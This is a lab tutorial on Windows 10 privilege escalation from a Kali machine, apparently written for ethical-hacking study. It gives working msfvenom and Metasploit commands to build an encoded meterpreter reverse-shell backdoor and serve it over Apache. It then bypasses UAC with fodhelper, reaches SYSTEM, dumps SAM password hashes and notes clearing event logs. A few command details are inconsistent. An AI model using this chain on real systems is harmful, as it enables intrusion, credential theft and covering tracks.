# Escalating Privileges

Privilege Escalation is the demonstration of misusing a bug, configuration imperfection, or design oversight in a working framework or programming application to increase lifted access to assets that are regularly shielded from an application or client.

Once attackers gain access to the target system, they start looking for different ways to escalate their privilege in the system. They can exploit vulnerability, design flaw or configuration oversight in the OS or software applications on the target system to gain elevated access to resources that are normally protected from an application or user. The privilege escalation can be **vertical** or **lateral**.

### Objectives
* Demonstrate how to escalate privileges on a victim machine by exploiting its vulnerabilities.

### Requisites
* Kali Linux virtual machine.
* Windows 10 virtual machine.

## Create a Backdoor
To create the malicious executable file, type this command and put your Kali IP address on `LHOST` option:

`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.0.2.42 -f exe > Desktop/Exploit.exe`

This command will create the Windows executable file named **Exploit.exe** and will be saved on the Kali **desktop**.

![exploit.exe](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/62f3153c4c87084931d3ec529bde0add9c8bf888/exploitexe.png)

## Share the Exploit.exe file
**First** of, we need to setup the apache configuration and the shared folder.

### Apache configuration

_If you didn't have apache2 installed, run **apt-get install apache2**._

Navigate to the apache2 folder, open the **apache2.conf** configuration file, and add a new line:<br>
`vim /etc/apache2/apache2.conf`

Add a new line with the command: `servername localhost` and save the file.

![apache.conf](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/1523fa1d4fdbc682f9908f33a01fbc1e08ba283c/apacheconf.png)

Create a new directory inside html folder:<br>
`mkdir /var/www/html/share/`<br>

Change the [mode](https://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html) for the share to **755**:<br>
`chmod -R 755 /var/www/html/share/`<br>

Change the ownership of that folder to **www-data**:<br>
`chown -R www-data:www-data /var/www/html/share/`

_To see the configuration of sharing options type:_<br>
`ls -la /var/www/html/ | grep share`
```
drwxr-xr-x 2 www-data www-data  4096 Dec 18 20:52 share
```

Now copy the malicious file to the shared location:<br>
`cp /root/Desktop/Test.exe /var/www/html/share/`

Start the apache service to run the http server:<br> `service apache2 start` 

## Perform Exploitation
Start the Metasploit Framework by typing:

`msfconsole`

Select the **multi/handler** and set the payload to **meterpreter/reverse_tcp**:

`use exploit/multi/handler`<br>
`set payload windows/meterpreter/reverse_tcp`

Set the **LHOST** to the Kali IP address:

`set LHOST 10.0.2.42`

Start the exploit on background:

`exploit -j -z`

```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.0.2.42:4444 
```

## Run the Exploit
Switch to the **Windows 10** machine, launch the **browser** and type the URL:

`http://10.0.2.42/share/` _(Change to the IP address of your your Kali)._

![share-exploit](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b65a2a5858140f439e8de89c919d452668346884/shareexploit.png)

Click **Exploit.exe** to download the backdoor file. Once the file is downloaded navigate to the download location and open the file to execute.

If an **Open File - Security Warning** window appears, click **Run**.

![Sec Warning](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png)

Switch back to the Kali machine. Meterpreter session has been successfully opened, as shown below:

```
[*] Sending stage (180291 bytes) to 10.0.2.15
[*] Meterpreter session 1 opened (10.0.2.42:4444 -> 10.0.2.15:49804) at 2019-12-18 21:04:09 -0500
```

To interact with the available sessions, you can use the command `sessions` or `sessions -i` to list the current sessions opened. **To open any session, select the ID by issuing the command:**

`sessions <ID>`

![sessions](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/2b57cd80a9fdbe2dfd1bf4ad18f9df32f894a256/sessions.png)

## Establish a Session
[[+] Meterpreter Cheat Sheet](https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf)

Open the current Meterpreter session and type:

`getuid`
```
meterpreter > getuid
Server username: DESKTOP-ICB2IQ4\dummy  
```
You will notice that the Meterpreter server is running with the normal user privileges. You will not be able to execute command (such as `hashdump`, which dumps the user account hashes located in the **SAM** file; `clearev`, which clears the event logs remotely; and so on.) that requires administrative/root privileges.

Let's check this out by executing this command:

`run post/windows/gather/smart_hashdump`

```
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against DESKTOP-ICB2IQ4
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20191218220106_default_10.0.2.15_windows.hashes_986306.txt
[-] Insufficient privileges to dump hashes!
```
**[-] Insufficient privileges to dump hashes!**

The command fails to dump the hashes from the SAM file located in Windows 10 and returns an error stating that Insufficient Privileges to dump hashes.

From this, it is evident that Meterpreter server requires admin privileges to perform such actions.

Now, we can try to escalate the privileges by issuing a `getsystem` command that attempts to elevate the user privileges.

`getsystem -t 1` 

_which uses the Service - [Named Pipe Impersonation](https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/) (In Memory/Admin) Technique._

```
meterpreter > getsystem -t 1
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
```

The command fails to escalate privileges and returns an error **(Access is Denied).**

From the above result, it is evident that the security configuration of the Windows 10 machine is blocking you from gaining unrestricted access to it.

## Perform Privilege Escalation

We can try to bypass the user account control setting that is blocking you from gaining unrestricted access to machine.

Move the current Meterpreter session to the background. Just type `background`.

Use the **bypassuac_fodhelper** exploit for Windows:<br>
`use exploit/windows/local/bypassuac_fodhelper`

Type `options` to see the configurations, and you will observer theres only session setting, type `sessions` to see the ID of the previous meterpreter session and set to the current exploit:

`set SESSION <ID>`

Type `run` to exploit:

![run-bypassuac_fodhelper](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/bypassuac_fodhelper.png)

**The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 10 machine and another Meterpreter session has opened.**

Now, the first thing is check the current User ID status of Meterpreter by issuing `getuid` command. You will observe that Meterpreter server is still running with **normal user privileges**.

`getuid`
```
meterpreter > getuid
Server username: DESKTOP-ICB2IQ4\dummy  
```

At this stage, we shall re-issue the `getsystem` command with the `-t 1` switch, in an attempt to **elevate the privileges**.

`getsystem -i 1`

```
meterpreter > getsystem -i 1

...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

**This time, the command has successfully escalated user privileges and returns a message stating got system, as shown above.**

Now, type `getuid` again.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The meterpreter session is now running with **SYSTEM** privileges (**NT AUTHORITY\SYSTEM**).

Let's try to obtain the **hashes** located in the **SAM** file of Windows 10 by typing:

`run post/windows/gather/smart_hashdump`

![getSystem](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/hashdump.png)

This time, the meterpreter successfully extracted the NTLM hashes and displayed them as shown in above. Thus, we have successfully escalated privileges by exploiting the Windows 10 machine's vulnerabilities.

**You can now execute commands like (clearev, which clears the event logs remotely, etc)**